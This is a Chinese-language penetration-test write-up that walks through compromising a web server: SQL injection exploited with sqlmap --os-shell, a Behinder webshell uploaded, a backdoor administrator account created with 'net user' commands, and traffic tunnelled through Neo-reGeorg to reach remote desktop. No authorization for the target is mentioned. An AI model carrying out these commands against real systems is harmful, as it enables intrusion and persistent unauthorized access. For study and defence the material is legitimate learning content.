## 本文相关知识点

SQlMAP --os-shell拿下webshell

众所周知，--os-shell的使用条件较为苛刻，必须满足：

  * dba权限

  * 网站绝对路径

  * php中的gpc为off，php为自动转义的状态

其中我想分享的是--os-shell的原理，其实就是很简单的两个脚本文件的上传：

遍历路径，into outfile函数将可执行的php文件，这个php文件（tmpukjhb.php）主要是起一个 **文件上传** 的作用。

然后通过tmpukjhb.php上传一个可以执行命令的php文件（tmpbezal.php），并将其结果返回出来。

（上次面试被问到了，没答出来，所以印象深刻）

nt authority \system和administrator

nt authority \system是系统的最高权限

administrator是用户的最高权限

reGeorg+proxifier流量转发

## 针对web应用服务器的getshell

通过对网站乱七八糟的一通乱点，发现有个熟悉的老朋友

![1637149548_6194eb6c467cee079282b.png!small?1637149549356](https://image.3001.net/images/20211117/1637149548_6194eb6c467cee079282b.png!small?1637149549356)

见到这种，就不得不试试sql注入了。

在后面跟上单引号，直接报错

![1637149553_6194eb71cdca1229c78f2.png!small?1637149554914](https://image.3001.net/images/20211117/1637149553_6194eb71cdca1229c78f2.png!small?1637149554914)

确定好注入点之后，sqlmap一把梭

一般我遇到sql注入首先看是不是dba权限，是的话大概率就能`--os-shell`就直接拿shell很方便。

麻溜的`--is-dba`，果然是

![1637149560_6194eb787c5607901b7f5.png!small?1637149561958](https://image.3001.net/images/20211117/1637149560_6194eb787c5607901b7f5.png!small?1637149561958)

虽然现在没有绝对路径，但是sqlmap有字典可以先试试

![1637149565_6194eb7d75252d1e0750d.png!small?1637149567280](https://image.3001.net/images/20211117/1637149565_6194eb7d75252d1e0750d.png!small?1637149567280)

![1637149570_6194eb82cc931f8c5b5c4.png!small?1637149572004](https://image.3001.net/images/20211117/1637149570_6194eb82cc931f8c5b5c4.png!small?1637149572004)

只能说是很perfect

但是鉴于sqlmap返回太慢且只能返回`whoami`(估计是被杀了)不方便之后的操作，所以我访问了根目录底下的tmpukjhb.php上传了一个冰蝎的马。

![1637149574_6194eb86d97d0eba85733.png!small?1637149576054](https://image.3001.net/images/20211117/1637149574_6194eb86d97d0eba85733.png!small?1637149576054)

  

* * *

## 不完全的后渗透

通过`whoami`命令可以知道当前用户是`nt authority \system`（怎么会有人用计算机最高权限去部署服务呢？我不理解）

当然，有了最高权限就可以为所欲为了（白捡了一个哈哈哈哈）

然后就是常规步骤了（也不能说是常规，主要是最高计算机管理员给省略了很多步骤）：

`net user`检查存在用户

![1637149584_6194eb9019142f45a87c1.png!small?1637149585134](https://image.3001.net/images/20211117/1637149584_6194eb9019142f45a87c1.png!small?1637149585134)

`net user admin admin / add`创建一个名为admin的管理员用户

![1637149588_6194eb945683b1aeb2cdf.png!small?1637149589431](https://image.3001.net/images/20211117/1637149588_6194eb945683b1aeb2cdf.png!small?1637149589431)

`net localgroup administrators admin /add`把admin用户添加到最高管理员用户组

![1637149597_6194eb9d9702f802bc247.png!small?1637149598667](https://image.3001.net/images/20211117/1637149597_6194eb9d9702f802bc247.png!small?1637149598667)

`net user admin`查看用户权限

![1637149602_6194eba279c541ddb91db.png!small?1637149603567](https://image.3001.net/images/20211117/1637149602_6194eba279c541ddb91db.png!small?1637149603567)

`netstat -an | find "3389"`查找3389端口是否开启

![1637149607_6194eba79a7b95c7a3ebd.png!small?1637149608681](https://image.3001.net/images/20211117/1637149607_6194eba79a7b95c7a3ebd.png!small?1637149608681)

接着使用neoreg转发流量，把tuunel.php上传到根目录，并访问它

![1637149615_6194ebaf1dc1c83c7028e.png!small?1637149616336](https://image.3001.net/images/20211117/1637149615_6194ebaf1dc1c83c7028e.png!small?1637149616336)

![1637149619_6194ebb318c3eca32463f.png!small?1637149620187](https://image.3001.net/images/20211117/1637149619_6194ebb318c3eca32463f.png!small?1637149620187)

使用本地4444端口建立socks连接：python3 neoreg.py -k shy -u
<https://xxx.com/php/tunnel.php>-p 4444

![1637149627_6194ebbb3ac203ff3b0ae.png!small?1637149628676](https://image.3001.net/images/20211117/1637149627_6194ebbb3ac203ff3b0ae.png!small?1637149628676)

测试代理：使用代理访问搜狗curl -x socks5h://127.0.0.1:4444 <https://www.sougou.com/>

![1637149632_6194ebc00488f5be0f22d.png!small?1637149633116](https://image.3001.net/images/20211117/1637149632_6194ebc00488f5be0f22d.png!small?1637149633116)

获取ip

![1637149638_6194ebc6e0266b0895ec1.png!small?1637149639941](https://image.3001.net/images/20211117/1637149638_6194ebc6e0266b0895ec1.png!small?1637149639941)

进行流量代理

![1637149642_6194ebcadcff559800310.png!small?1637149643913](https://image.3001.net/images/20211117/1637149642_6194ebcadcff559800310.png!small?1637149643913)

把loaclhost改成socks5代理

![1637149648_6194ebd07937b1532a1fb.png!small?1637149649539](https://image.3001.net/images/20211117/1637149648_6194ebd07937b1532a1fb.png!small?1637149649539)

然后去远程桌面连接，把允许多人远程在线开启起来，方便之后的操作

![1637149655_6194ebd74a619e88776ad.png!small?1637149656494](https://image.3001.net/images/20211117/1637149655_6194ebd74a619e88776ad.png!small?1637149656494)

## 结语

小菜鸟的文章，后面的操作比如横向、维持、清理等，都没有去做，只能说还要继续努力呀！

因为是从我笔记里面截的图（之前的图没有脱敏），所以可能有点糊，影响大家的观感（当然我觉得我这种小菜鸟的文章应该没人看哈哈哈哈），很真诚的给大家致歉！

如果本文有不正确的地方，希望各位大佬多(轻)多（点）包（喷）含（我），不（搞）吝（快）赐（带）教（我）！谢谢大家！

## 参考链接

<https://www.cnblogs.com/zzjdbk/p/13951047.html>

<https://www.cnblogs.com/-qing-/p/10517114.html>

